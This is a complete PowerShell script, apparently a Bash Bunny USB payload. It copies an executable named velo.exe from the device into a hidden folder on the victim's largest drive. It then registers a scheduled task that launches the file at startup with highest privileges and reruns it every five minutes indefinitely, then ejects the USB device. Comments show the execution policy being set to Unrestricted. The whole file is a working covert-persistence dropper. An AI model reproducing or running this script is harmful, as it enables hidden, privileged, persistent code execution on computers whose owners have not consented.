#Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
# y then enter to active this script
#Start-Process powershell -Verb runAs


#V 1.5
#For drive
$LogicalDisks = get-WmiObject Win32_LogicalDisk
$BashBunnyName = "BASHBUNNY"
$BashBunnyDeviceID = "None"
$BashBunnyPayloadDir = "\payloads\switch1" #No slash at end
$BashBunnyPayloadName = "\velo.exe"
$BashBunnyPayloadOnlyName = "velo"

#For folder
$FolderName = "\WindowsStartUpVelo" #No slash at end
$MostSpace = 0 #Drive space
$MostNameDeviceID = "None" #Drive name Id with most space




foreach ( $drive in $LogicalDisks ) {
    if ($drive.VolumeName -eq $BashBunnyName) {
        $BashBunnyDeviceID = $Drive.DeviceID
    }
    else {
        $FreeSpace = $drive.FreeSpace
        if ($FreeSpace -gt $MostSpace) {
            $MostSpace = $FreeSpace
            $MostNameDeviceID = $Drive.DeviceID
        }
    }
}


Write-Host $MostNameDeviceID

New-Item -ItemType directory -Path $MostNameDeviceID$FolderName -ErrorAction SilentlyContinue

attrib.exe +h $MostNameDeviceID$FolderName

Stop-Process -Name $BashBunnyPayloadOnlyName -Force -ErrorAction SilentlyContinue

Copy-Item $BashBunnyDeviceID$BashBunnyPayloadDir$BashBunnyPayloadName  -Destination $MostNameDeviceID$FolderName$BashBunnyPayloadName -Force -ErrorAction SilentlyContinue


#For task
$UserId = $env:UserName
$TaskName = "Velo"
$TaskDescription = "Velo Running"
$Path = $MostNameDeviceID + $FolderName + $BashBunnyPayloadName
$RepetInterval = "PT5M" #  PTminutesM

function Get-FixTheTask {
    $Task = Get-ScheduledTask -TaskName $TaskName
    $Task.Triggers.Repetition.Interval = $RepetInterval
    $Task.Triggers.Repetition.StopAtDurationEnd = $false # on to infinity
    Set-ScheduledTask $Task
    $NSTA = New-ScheduledTaskAction -Execute $Path
    Set-ScheduledTask -TaskName $TaskName -Action $NSTA
    Start-ScheduledTask -TaskName $TaskName
}


if ($(Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue).TaskName -eq $TaskName) {
    Get-FixTheTask
}

else {
    $NSTA = New-ScheduledTaskAction -Execute $Path
    $NSTT = New-ScheduledTaskTrigger -AtStartup
    $NSTP = New-ScheduledTaskPrincipal -UserId $UserId  -RunLevel Highest
    $NSTS = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit 0
    $NST = New-ScheduledTask -Action $NSTA -Principal $NSTP -Trigger $NSTT -Settings $NSTS -Description $TaskDescription

    Register-ScheduledTask -TaskName $TaskName -InputObject $NST
    Get-FixTheTask

}


#Ejecting the bashbunny
$BB = Get-WMIObject Win32_Volume | Where-Object { $_.Label -eq $BashBunnyName } | Select-Object -First 1 -ExpandProperty Driveletter
$driveEject = New-Object -comObject Shell.Application
$driveEject.Namespace(17).ParseName("$BB").InvokeVerb("Eject")

exit



